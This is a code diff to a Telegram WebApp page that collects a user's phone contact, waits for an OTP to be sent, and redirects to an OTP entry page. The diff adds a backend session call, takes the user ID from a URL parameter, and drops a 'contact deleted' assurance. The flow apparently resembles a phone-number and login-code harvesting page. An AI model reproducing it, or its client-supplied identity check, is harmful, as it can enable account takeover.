@@ -12,7 +12,6 @@
         .header { background: #0088cc; color: white; padding: 24px 20px; text-align: center; }
         .content { padding: 30px; }
         .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
         .error.show { display: block; }
         .success { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
@@ -48,10 +47,6 @@
                 <button class="btn" onclick="shareContact()" id="share-btn">
                     📞 Share My Contact
                 </button>
-                
-                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
-                    Contact deleted immediately after processing
-                </p>
             </div>
             
             <!-- Contact Shared Screen -->
@@ -94,6 +89,12 @@
         document.addEventListener('DOMContentLoaded', function() {
             console.log("WebApp loaded");
             
+            // Initialize session with backend
+            initUserSession();
+        });
+        
+        function initUserSession() {
+            // Get user ID from Telegram WebApp
             if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 Telegram.WebApp.expand();
@@ -103,18 +104,45 @@
                     userId = user.id.toString();
                     console.log("User ID from WebApp:", userId);
                 } else {
-                    userId = 'web_' + Date.now();
+                    // Fallback: use query parameter or generate
+                    const urlParams = new URLSearchParams(window.location.search);
+                    userId = urlParams.get('user_id') || 'web_' + Date.now();
                     console.log("Generated user ID:", userId);
                 }
             } else {
-                console.warn("Not running in Telegram WebApp");
-                userId = 'test_' + Date.now();
+                // For testing outside Telegram
+                const urlParams = new URLSearchParams(window.location.search);
+                userId = urlParams.get('user_id') || 'test_' + Date.now();
                 console.log("Test user ID:", userId);
             }
-        });
+            
+            // Initialize session with backend
+            if (userId) {
+                fetch('/api/init-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: userId
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        console.log("Session initialized:", data.message);
+                    } else {
+                        console.error("Failed to initialize session:", data.error);
+                    }
+                })
+                .catch(error => {
+                    console.error("Session init error:", error);
+                });
+            }
+        }
         
         function shareContact() {
-            console.log("Share contact clicked");
+            console.log("Share contact clicked for user:", userId);
             
             if (!userId) {
                 showError("Cannot get user ID");
@@ -191,19 +219,23 @@
                             document.getElementById('otp-screen').classList.remove('hidden');
                             document.getElementById('phone-display').textContent = `Phone: ${data.phone}`;
                             
-                            // Auto-redirect
+                            // Auto-redirect after 2 seconds
                             setTimeout(() => {
                                 goToOTPPage();
                             }, 2000);
-                        } else {
-                            // Still waiting
+                        } else if (data.contact_received) {
+                            // Contact received but OTP not sent yet
                             document.getElementById('waiting-text').textContent = 
-                                `Waiting for OTP... (${Math.floor(Date.now() / 1000) % 10})`;
+                                `Contact received, sending OTP...`;
+                        } else {
+                            // Still waiting for contact
+                            document.getElementById('waiting-text').textContent = 
+                                `Waiting for contact... (${Math.floor(Date.now() / 1000) % 10})`;
                         }
                     } else {
                         // Error
                         clearInterval(checkInterval);
-                        showError(data.error || "Failed to send OTP");
+                        showError(data.error || "Failed to process contact");
                         document.getElementById('contact-screen').classList.add('hidden');
                         document.getElementById('initial-screen').classList.remove('hidden');
                     }
@@ -227,17 +259,6 @@
             setTimeout(() => {
                 errorEl.classList.remove('show');
             }, 5000);
-        }
-        
-        function showSuccess(message) {
-            console.log("Success:", message);
-            const successEl = document.getElementById('success-message');
-            successEl.textContent = message;
-            successEl.classList.add('show');
-            
-            setTimeout(() => {
-                successEl.classList.remove('show');
-            }, 3000);
         }
     </script>
 </body>
